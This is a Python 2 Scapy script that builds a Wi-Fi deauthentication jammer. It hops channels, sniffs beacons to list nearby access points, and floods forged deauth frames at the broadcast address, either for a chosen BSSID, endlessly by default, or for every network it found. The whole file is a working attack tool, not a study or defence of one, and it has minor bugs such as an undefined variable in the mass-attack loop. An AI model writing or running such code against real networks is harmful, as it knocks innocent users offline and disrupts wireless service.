from scapy.all  import *
import random
import sys
from multiprocessing import Process

class Jammer:
    def __init__(self, interface):
        self.INTERFACE = interface # Var to store the selected interface
        self.STOP_SNIFF = False #Sniffing flag
        self.NETWORKS = {} #Dictionary to store available accesspoints
        self.ATTACK_STOP = False #Attacking flag

    def get_stop_sniff(self):
        return self.STOP_SNIFF

    def get_channel_hop_process(self):
        return Process(target= self.start_channel_hop, args=(False,) )

    def get_channel_hop_cycle_process(self):
        return Process(target= self.start_channel_hop, args=(True,) )

    def start_channel_hop(self, oneCycle):
        counterChannel = 1
        while not self.STOP_SNIFF:
            try:
                channel = random.randrange(1,13)
                os.system("iwconfig %s channel %d" % (self.INTERFACE, counterChannel))
                time.sleep(3)
                if counterChannel <= 12:
                    counterChannel+=1
                else :
                    if oneCycle:
                        self.STOP_SNIFF = True
                    else:
                        counterChannel = 1
            except KeyboardInterrupt:
                break

    def stop_channel_hop(self):
        self.STOP_SNIFF = False

    def sniff(self):
        sniff(
            iface = self.INTERFACE,
            lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)),
            stop_filter= lambda x: (self.STOP_SNIFF ),
            prn = lambda x: self.add_network(x) )

    # Method capable of finding and adding new networks to NETWORKS list
    def add_network(self, pckt):
        essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info  and pckt[Dot11Elt].info != '' else 'Hidden SSID'
        bssid = pckt[Dot11].addr3
        channel = int(ord(pckt[Dot11Elt:3].info))
        if bssid not in self.NETWORKS:
            self.NETWORKS[bssid] = (essid, channel)
            print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)

    #Mehod capable of send deauth messages to a specific AccessPoint
    def perform_deauth(self, bssid, client, count):
        pckt =  RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
        print("Sending Deauth to %s from %s" % (client, bssid))

        if count == -1:
            print("Press CTRL+C to quit")
            while not self.ATTACK_STOP:
                sendp(pckt, iface=self.INTERFACE, inter = .1, count=1)
        else:
            sendp(pckt, iface=self.INTERFACE, inter = .1, count=count)

    def selectBSSID(self):
        target_accesspoint = raw_input('Enter a BSSID to perform a deauth attack(q to quit): ')
        while target_accesspoint not in self.NETWORKS:
            if target_accesspoint == 'q': sys.exit(0)
            target_accesspoint = raw_input("BSSID not founded, please verify (q to quit) :")
        print("Setting interface  %s to channel %d "% (self.INTERFACE, self.NETWORKS[target_accesspoint][1]) )
        os.system("iwconfig %s channel %d" % (self.INTERFACE, self.NETWORKS[target_accesspoint][1]) )
        deauth_pckt_count = raw_input("Number of packets to send (default: infinite):")
        if not deauth_pckt_count:
            deauth_pckt_count = -1
        else:
            deauth_pckt_count = int(deauth_pckt_count)
        return Process(target = self.perform_deauth, args=(target_accesspoint, 'FF:FF:FF:FF:FF:FF', deauth_pckt_count))

    def attackBSSID(self):
        while not self.ATTACK_STOP:
            try:
                for bssid in self.NETWORKS:
                    print("Sending Deauth to %s from %s" % (client, bssid))
                    pckt =  RadioTap() / Dot11(addr1='FF:FF:FF:FF:FF:FF', addr2=bssid, addr3=bssid) / Dot11Deauth()
                    sendp(pckt, iface=self.INTERFACE, inter = .01, count=5)
            except KeyboardInterrupt:
                self.ATTACK_STOP = True


    def stop_attack(self):
        self.ATTACK_STOP = True
